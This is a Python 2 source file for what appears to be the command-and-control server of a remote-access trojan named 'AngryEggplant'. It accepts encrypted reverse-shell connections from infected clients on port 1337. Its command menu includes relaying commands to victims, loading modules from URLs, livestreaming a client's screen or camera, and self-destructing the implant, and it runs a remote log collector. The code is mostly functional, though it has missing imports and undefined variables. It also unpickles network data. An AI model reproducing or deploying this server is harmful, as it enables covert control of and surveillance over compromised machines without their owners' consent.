#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright (c) 2017 colental
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

BANNER = '''

,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,  aa       aa
""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a 88       88
,adPPPPP88 88       88 8b       88 88	       8b	88
88,    ,88 88       88 "8a,   ,d88 88	       "8a,   ,d88
`"8bbdP"Y8 88       88  `"YbbdP"Y8 88           `"YbbdP"Y8
                        aa,    ,88 	        aa,    ,88
                         "Y8bbdP"          	 "Y8bbdP'

                                               88                          ,d
                                               88                          88
 ,adPPYba,  ,adPPYb,d8  ,adPPYb,d8 8b,dPPYba,  88 ,adPPYYba, 8b,dPPYba,    88
a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
8PP""""""" 8b       88 8b       88 88       d8 88 ,adPPPPP88 88       88   88
"8b,   ,aa "8a,   ,d88 "8a,   ,d88 88b,   ,a8" 88 88,    ,88 88       88   88
 `"Ybbd8"'  `"YbbdP"Y8  `"YbbdP"Y8 88`YbbdP"'  88 `"8bbdP"Y8 88       88   88,
            aa,    ,88  aa,    ,88 88                                      "Y888
             "Y8bbdP"    "Y8bbdP"  88


https://github.com/colental/AngryEggplant

'''

import os
import sys
import time
import socket
import select
import struct
import logging
import requests
import threading
import subprocess
import socketserver
import logging.handlers
from base64 import b64encode, b64decode
from Crypto.Cipher import AES
from Crypto.Hash import SHA256, HMAC
from Crypto.Util.number import bytes_to_long, long_to_bytes

# globals

debug                   =True
exit_status             =False
socket.setdefaulttimeout(None)

HELP_CMDS   = ''' 

-----------------------------------------------------------------------------
COMMAND               | DESCRIPTION
---------------------------------------------------------------------------
client <id>            | Connect to a client
clients                | List connected clients
back                   | Deselect current client
help                   | Show this help menu
kill [id]              | Kill the client connection
quit                   | Exit server and keep clients alive
selfdestruct           | Remove client from target system
run [module]           | Run module once [no selection = all modules]
set <module> [x=y]     | Set module options
use <module>           | Enable module
stop <module>          | Disable module
options                | List all options for each module
list <type>            | List all commands or modules
results                | List all results
status                 | Display session status
module <url>           | Load a new module on client from a URL
mode <standby/active>  | Change client operating mode
----------------------------------------------------------------------------
< > = required argument
[ ] = optional argument
'''


class Server(object):
    global exit_status
    def __init__(self, port=1337):
        super(Server, self).__init__()
        self.count          = 0
        self.lock           = threading.Lock()
        self.current_client = None
        self.clients        = {}
        self.commands       = {
	    'back'	    :   self.deselect_client,
            'client'        :   self.select_client,
            'clients'       :   self.list_clients,
            'help'          :   self.print_help,
            'quit'          :   self.quit_server,
	    'sendall'	    :   self.sendall_clients,
            'info'          :   self.identify_client,
            'stream'        :   self.livestream_client
            }
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('0.0.0.0', port))
        self.s.listen(5)

    def pad(self, data):
        return data + b'\0' * (AES.block_size - len(data) % AES.block_size)

    def diffiehellman(self, connection, bits=2048):
        p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
        g = 2
        a = bytes_to_long(os.urandom(32))
        xA = pow(g, a, p)
        connection.sendall(long_to_bytes(xA))
        xB = bytes_to_long(connection.recv(256))
        x = pow(xB, a, p)
        return SHA256.new(long_to_bytes(x)).digest()

    def encrypt(self, dhkey, plaintext):
        text        = self.pad(plaintext)
        iv          = os.urandom(AES.block_size)
        cipher      = AES.new(dhkey[:16], AES.MODE_CBC, iv)
        ciphertext  = iv + cipher.encrypt(text)
        hmac_sha256 = HMAC.new(dhkey[16:], msg=ciphertext, digestmod=SHA256).digest()
        return b64encode(ciphertext + hmac_sha256)

    def decrypt(self, dhkey, encrypted):
        ciphertext  = b64decode(encrypted)
        iv          = ciphertext[:AES.block_size]
        cipher      = AES.new(dhkey[:16], AES.MODE_CBC, iv)
        hash_check  = ciphertext[-SHA256.digest_size:]
        verify      = HMAC.new(dhkey[16:], msg=ciphertext[:-SHA256.digest_size], digestmod=SHA256).digest()
        if verify  != hash_check:
            with self.lock:
                print "Warning: HMAC-SHA256 hash authentication failed"
        return cipher.decrypt(ciphertext[len(iv):-SHA256.digest_size]).rstrip(b'\0')

    def deobfuscate(self, block):
        p = []
        block = b64decode(block)
        for i in xrange(2, len(block)):
            is_mul = False
            for j in p:
                if i % j == 0: 
                    is_mul = True
                    break
            if not is_mul:
                p.append(i)
        output = str().join([block[i] for i in p])
        return self._long_to_bytes(long(output, 2))

    def obfuscate(self, data):
        data    = bin(self._bytes_to_long(bytes(data)))
        p       = []
        block   = os.urandom(2)
        for i in xrange(2, 10000):
            is_mul = False
            for j in p:
                if i % j == 0:
                    is_mul = True
                    block += os.urandom(1)
                    break
            if not is_mul:
                if len(data):
                    p.append(i)
                    block += data[0]
                    data = data[1:]
                else:
                    return b64encode(block)

    def select_client(self, client_id):
        if self.current_client:
            self.current_client.lock.acquire_lock()
        self.current_client = self.clients[int(client_id)]
        self.current_client.lock.release_lock()
        with self.lock:
            print '\nClient {} selected\n'.format(client_id)
        return self.current_client.run()

    def deselect_client(self):
        if self.current_client:
            self.current_client.lock.acquire_lock()
            self.current_client = None
        self.run()

    def send_client(self, msg, client=None):
        if not client:
            client = self.current_client
        data = self.encrypt(client.dhkey, msg) + '\n'
        client.conn.sendall(data)

    def sendall_clients(self, msg):
        for client in self.get_clients():
            self.send_client(msg, client)

    def remove_client(self, key):
        return self.clients.pop(int(key), None)

    def selfdestruct_client(self, client_id=None):
        if client_id:
            client = self.clients.get(int(client_id)) or self.current_client
            self.send_client('selfdestruct', client)
            client.conn.close()
            self.remove_client(client.name)

    def get_clients(self):
        return [v for _, v in self.current_client.items()]

    def list_clients(self):
        print '\nID | Client Address\n-------------------'
        for k, v in self.clients.items():
            print '{:>2} | {}'.format(k, v.addr[0])
        print '\n'

    def print_help(self):
        with self.lock:
            print HELP_CMDS

    def quit_server(self):
        with self.lock:
            q = raw_input('Exit the server and keep all clients alive (y/N)? ')
        if q.lower().startswith('y'):
            try:
                for client in self.get_clients():
                    try:
                        self.send_client('mode standby', client)
                    except: pass
            finally:
                sys.exit(0)

    def livestream_client(self, client=None):
        data    = ""
        header  = struct.calcsize("L")
        client  = client or self.current_client
        if client:
            while True:
                while len(data) < header:
                    data   += client.conn.recv(4096)
                packed_size = data[:header]
                data        = data[header:]
                msg_size    = struct.unpack("L", packed_size)[0]
                while len(data) < msg_size:
                    data   += client.conn.recv(4096)
                frame_data  = data[:msg_size]
                data        = data[msg_size:]
                frame       = pickle.loads(frame_data)    
                cv2.imshow(client.addr, frame)
                if cv2.waitKey(30) & 0xFF == 27:
                    break
            cv2.destroyAllWindows()

    def identify_client(self, client=None):
        client = client or self.current_client
        if client:
            self.send_client('info', client)
            method, message = self.recv_client(client)
            client.info     = message
            return client.info
        
    def recv_client(self, client=None):
        client = client or self.current_client
        buffer, method, message  = "", "", ""
        if client:
            while "\n" not in buffer:
                buffer += client.conn.recv(4096)
            if len(buffer):
                method, _, message = buffer.partition(':')
                message = server.decrypt(client.dhkey, message)
        return method, message

    def manager(self):
        while True:
            conn, addr  = self.s.accept()
            name        = len(self.clients) + 1
            client      = ClientHandler(conn, addr, name)
            self.clients[name] = client
            client.lock.acquire()
            client.start()
            if exit_status:
                break

    def run(self):
        t1 = threading.Thread(target=self.manager)
        t1.start()
        while True:
            if exit_status:
                break
            if not self.current_client:
                output = ''
                with self.lock:
                    cmd_buffer = raw_input('$ ')
                cmd, _, action = cmd_buffer.partition(' ')
                if cmd in self.commands:
                    try:
                        output = self.commands[cmd](action) if len(action) else self.commands[cmd]()
                    except Exception as e1:
                        output = str(e1)
                else:
                    try:
                        output = subprocess.check_output(cmd_buffer, shell=True)
                    except Exception as e2:
                        output = str(e2)
                if output and len(output):
                    with self.lock:
                        print output


class ClientHandler(threading.Thread):
    global server
    global debug
    global exit_status

    def __init__(self, conn, addr, name):
        super(ClientHandler, self).__init__()
        self.conn   = conn
        self.addr   = addr
        self.name   = name
        self.info   = {}
        self.dhkey  = server.diffiehellman(conn)
        self.lock   = threading.Lock()

    def status(self):
        return '\nCurrent session duration: %d days, %d hours, %d minutes, %d seconds\n' % (int(time.clock()/86400.0), int((time.clock()%86400.0)/3600.0), int((time.clock()%3600.0)/60.0), int(time.clock() % 60.0))
                 
    def run(self, prompt=None):
        while True:
            if exit_status:
                break
            with self.lock:
                method, data = ('prompt', prompt) if prompt else server.recv_client()
            if 'prompt' in method:
                command = raw_input(data)
                cmd, _, action = command.partition(' ')
                if cmd in server.commands:
                    result = server.commands[cmd](action) if len(action) else server.commands[cmd]()
                    with self.lock:
                        print result
                    self.run(prompt=data)
                else:
                    server.send_client(command)
                    self.run()
            elif len(data):
                print data
                

class LogRecordHandler(socketserver.StreamRequestHandler):
    global debug
    global exit_status

    def handle(self):
        while True:
            if exit_status:
                break
            chunk   = self.connection.recv(4)
            if len(chunk) < 4:
                break
            slen    = struct.unpack('>L', chunk)[0]
            chunk   = self.connection.recv(slen)

            while len(chunk) < slen:
                chunk = chunk + self.connection.recv(slen - len(chunk))

            obj     = pickle.loads(chunk)
            record  = logging.makeLogRecord(obj)
            logname = os.path.join(tempfile.gettempdir(), str(record.name)) + '.txt'
            fp = file(logname, 'a')
            fp.write('{} {:>20} {:>15} {}\n'.format(time.ctime(), record.name, record.submodule, record.msg))
            fp.close()


class LogRecordServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = 1

    global exit_status

    def __init__(self, host='localhost',
                 port=4321,
                 handler=LogRecordHandler):

        socketserver.ThreadingTCPServer.__init__(self, (host, port), handler)
        self.host    = host
        self.port    = port
        self.timeout = 1
        self.logname = None

    def serve_until_stopped(self):
        while True:
            if exit_status:
                break
            try:
                rd, wr, ex = select.select([self.socket.fileno()], [], [], self.timeout)
                if rd:
                    self.handle_request()
            except KeyboardInterrupt:
                break
            

if __name__ == '__main__':
    print BANNER
    logging.basicConfig(format='%(asctime)s %(name)-20s %(submodule)-15s %(message)s')
    logger  = LogRecordServer()
    server  = Server()
    server.run()
    logger.serve_until_stopped()
    print "Listening on port [%d] for reverse-shells and port [%d] for remote-logging\n" % (server_port, logger_port)


